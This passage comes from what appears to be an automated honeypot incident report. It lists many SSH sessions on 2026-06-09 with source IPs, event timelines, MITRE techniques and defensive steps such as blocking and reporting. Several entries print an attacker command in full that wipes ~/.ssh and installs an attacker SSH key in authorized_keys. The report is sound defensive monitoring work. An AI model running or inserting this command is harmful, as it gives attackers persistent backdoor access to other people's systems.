| `2026-06-09 09:28:47` | `cowrie.client.version` |
| `2026-06-09 09:28:47` | `cowrie.client.kex` |
| `2026-06-09 09:28:48` | `cowrie.login.success` |
| `2026-06-09 09:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e2657575ec

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:28 |
| **Last Seen** | 2026-06-09 09:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:28:49` | `cowrie.session.connect` |
| `2026-06-09 09:28:49` | `cowrie.client.version` |
| `2026-06-09 09:28:49` | `cowrie.client.kex` |
| `2026-06-09 09:28:49` | `cowrie.login.success` |
| `2026-06-09 09:28:50` | `cowrie.session.params` |
| `2026-06-09 09:28:50` | `cowrie.command.input` |
| `2026-06-09 09:28:50` | `cowrie.command.failed` |
| `2026-06-09 09:28:50` | `cowrie.log.closed` |
| `2026-06-09 09:28:50` | `cowrie.session.params` |
| `2026-06-09 09:28:50` | `cowrie.command.input` |
| `2026-06-09 09:28:50` | `cowrie.session.file_download` |
| `2026-06-09 09:28:50` | `cowrie.log.closed` |
| `2026-06-09 09:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8de6607e6805

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:28 |
| **Last Seen** | 2026-06-09 09:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:28:52` | `cowrie.session.connect` |
| `2026-06-09 09:28:52` | `cowrie.client.version` |
| `2026-06-09 09:28:52` | `cowrie.client.kex` |
| `2026-06-09 09:28:53` | `cowrie.login.success` |
| `2026-06-09 09:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddfff0f6d1ea

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:30 |
| **Last Seen** | 2026-06-09 09:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:30:51` | `cowrie.session.connect` |
| `2026-06-09 09:30:51` | `cowrie.client.version` |
| `2026-06-09 09:30:51` | `cowrie.client.kex` |
| `2026-06-09 09:30:52` | `cowrie.login.success` |
| `2026-06-09 09:30:52` | `cowrie.session.params` |
| `2026-06-09 09:30:52` | `cowrie.command.input` |
| `2026-06-09 09:30:52` | `cowrie.command.failed` |
| `2026-06-09 09:30:52` | `cowrie.log.closed` |
| `2026-06-09 09:30:52` | `cowrie.session.params` |
| `2026-06-09 09:30:52` | `cowrie.command.input` |
| `2026-06-09 09:30:52` | `cowrie.session.file_download` |
| `2026-06-09 09:30:52` | `cowrie.log.closed` |
| `2026-06-09 09:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445e6a1f1de7

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:30 |
| **Last Seen** | 2026-06-09 09:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:30:54` | `cowrie.session.connect` |
| `2026-06-09 09:30:54` | `cowrie.client.version` |
| `2026-06-09 09:30:54` | `cowrie.client.kex` |
| `2026-06-09 09:30:55` | `cowrie.login.success` |
| `2026-06-09 09:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-262892cff30a

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:32 |
| **Last Seen** | 2026-06-09 09:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:32:33` | `cowrie.session.connect` |
| `2026-06-09 09:32:33` | `cowrie.client.version` |
| `2026-06-09 09:32:34` | `cowrie.client.kex` |
| `2026-06-09 09:32:35` | `cowrie.login.success` |
| `2026-06-09 09:32:36` | `cowrie.session.params` |
| `2026-06-09 09:32:36` | `cowrie.command.input` |
| `2026-06-09 09:32:36` | `cowrie.command.failed` |
| `2026-06-09 09:32:36` | `cowrie.log.closed` |
| `2026-06-09 09:32:36` | `cowrie.session.params` |
| `2026-06-09 09:32:36` | `cowrie.command.input` |
| `2026-06-09 09:32:37` | `cowrie.session.file_download` |
| `2026-06-09 09:32:37` | `cowrie.log.closed` |
| `2026-06-09 09:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e527af7e710

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:32 |
| **Last Seen** | 2026-06-09 09:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:32:38` | `cowrie.session.connect` |
| `2026-06-09 09:32:38` | `cowrie.client.version` |
| `2026-06-09 09:32:39` | `cowrie.client.kex` |
| `2026-06-09 09:32:40` | `cowrie.login.success` |
| `2026-06-09 09:32:40` | `cowrie.session.params` |
| `2026-06-09 09:32:40` | `cowrie.command.input` |
| `2026-06-09 09:32:40` | `cowrie.command.failed` |
| `2026-06-09 09:32:41` | `cowrie.log.closed` |
| `2026-06-09 09:32:41` | `cowrie.session.params` |
| `2026-06-09 09:32:41` | `cowrie.command.input` |
| `2026-06-09 09:32:41` | `cowrie.session.file_download` |
| `2026-06-09 09:32:41` | `cowrie.log.closed` |
| `2026-06-09 09:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-082940d27d5f

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:32 |
| **Last Seen** | 2026-06-09 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:32:40` | `cowrie.session.connect` |
| `2026-06-09 09:32:40` | `cowrie.client.version` |
| `2026-06-09 09:32:40` | `cowrie.client.kex` |
| `2026-06-09 09:32:41` | `cowrie.login.success` |
| `2026-06-09 09:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b09f291001ca

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:32 |
| **Last Seen** | 2026-06-09 09:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:32:44` | `cowrie.session.connect` |
| `2026-06-09 09:32:44` | `cowrie.client.version` |
| `2026-06-09 09:32:45` | `cowrie.client.kex` |
| `2026-06-09 09:32:46` | `cowrie.login.success` |
| `2026-06-09 09:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f34320c3ca85

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:32 |
| **Last Seen** | 2026-06-09 09:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:32:53` | `cowrie.session.connect` |
| `2026-06-09 09:32:53` | `cowrie.client.version` |
| `2026-06-09 09:32:53` | `cowrie.client.kex` |
| `2026-06-09 09:32:53` | `cowrie.login.success` |
| `2026-06-09 09:32:53` | `cowrie.session.params` |
| `2026-06-09 09:32:53` | `cowrie.command.input` |
| `2026-06-09 09:32:53` | `cowrie.command.failed` |
| `2026-06-09 09:32:54` | `cowrie.log.closed` |
| `2026-06-09 09:32:54` | `cowrie.session.params` |
| `2026-06-09 09:32:54` | `cowrie.command.input` |
| `2026-06-09 09:32:54` | `cowrie.session.file_download` |
| `2026-06-09 09:32:54` | `cowrie.log.closed` |
| `2026-06-09 09:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e01594954ea

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:32 |
| **Last Seen** | 2026-06-09 09:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:32:56` | `cowrie.session.connect` |
| `2026-06-09 09:32:56` | `cowrie.client.version` |
| `2026-06-09 09:32:56` | `cowrie.client.kex` |
| `2026-06-09 09:32:56` | `cowrie.login.success` |
| `2026-06-09 09:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d2dd34d33c

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:34 |
| **Last Seen** | 2026-06-09 09:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:34:12` | `cowrie.session.connect` |
| `2026-06-09 09:34:12` | `cowrie.client.version` |
| `2026-06-09 09:34:12` | `cowrie.client.kex` |
| `2026-06-09 09:34:14` | `cowrie.login.success` |
| `2026-06-09 09:34:14` | `cowrie.session.params` |
| `2026-06-09 09:34:14` | `cowrie.command.input` |
| `2026-06-09 09:34:14` | `cowrie.command.failed` |
| `2026-06-09 09:34:15` | `cowrie.log.closed` |
| `2026-06-09 09:34:15` | `cowrie.session.params` |
| `2026-06-09 09:34:15` | `cowrie.command.input` |
| `2026-06-09 09:34:15` | `cowrie.session.file_download` |
| `2026-06-09 09:34:15` | `cowrie.log.closed` |
| `2026-06-09 09:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a27e67b41f26

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:34 |
| **Last Seen** | 2026-06-09 09:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:34:18` | `cowrie.session.connect` |
| `2026-06-09 09:34:18` | `cowrie.client.version` |
| `2026-06-09 09:34:18` | `cowrie.client.kex` |
| `2026-06-09 09:34:20` | `cowrie.login.success` |
| `2026-06-09 09:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cfe63ca04e8

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:34 |
| **Last Seen** | 2026-06-09 09:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:34:22` | `cowrie.session.connect` |
| `2026-06-09 09:34:22` | `cowrie.client.version` |
| `2026-06-09 09:34:22` | `cowrie.client.kex` |
| `2026-06-09 09:34:23` | `cowrie.login.success` |
| `2026-06-09 09:34:24` | `cowrie.session.params` |
| `2026-06-09 09:34:24` | `cowrie.command.input` |
| `2026-06-09 09:34:24` | `cowrie.command.failed` |
| `2026-06-09 09:34:25` | `cowrie.log.closed` |
| `2026-06-09 09:34:25` | `cowrie.session.params` |
| `2026-06-09 09:34:25` | `cowrie.command.input` |
| `2026-06-09 09:34:25` | `cowrie.session.file_download` |
| `2026-06-09 09:34:25` | `cowrie.log.closed` |
| `2026-06-09 09:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a763b23b7698

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:34 |
| **Last Seen** | 2026-06-09 09:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:34:28` | `cowrie.session.connect` |
| `2026-06-09 09:34:28` | `cowrie.client.version` |
| `2026-06-09 09:34:29` | `cowrie.client.kex` |
| `2026-06-09 09:34:30` | `cowrie.login.success` |
| `2026-06-09 09:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d9d4e9ef79c

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:35 |
| **Last Seen** | 2026-06-09 09:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:35:03` | `cowrie.session.connect` |
| `2026-06-09 09:35:03` | `cowrie.client.version` |
| `2026-06-09 09:35:04` | `cowrie.client.kex` |
| `2026-06-09 09:35:04` | `cowrie.login.success` |
| `2026-06-09 09:35:04` | `cowrie.session.params` |
| `2026-06-09 09:35:04` | `cowrie.command.input` |
| `2026-06-09 09:35:04` | `cowrie.command.failed` |
| `2026-06-09 09:35:05` | `cowrie.log.closed` |
| `2026-06-09 09:35:05` | `cowrie.session.params` |
| `2026-06-09 09:35:05` | `cowrie.command.input` |
| `2026-06-09 09:35:05` | `cowrie.session.file_download` |
| `2026-06-09 09:35:05` | `cowrie.log.closed` |
| `2026-06-09 09:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59519afc3156

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:35 |
| **Last Seen** | 2026-06-09 09:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:35:07` | `cowrie.session.connect` |
| `2026-06-09 09:35:07` | `cowrie.client.version` |
| `2026-06-09 09:35:07` | `cowrie.client.kex` |
| `2026-06-09 09:35:08` | `cowrie.login.success` |
| `2026-06-09 09:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-883e1625febd

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:36 |
| **Last Seen** | 2026-06-09 09:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
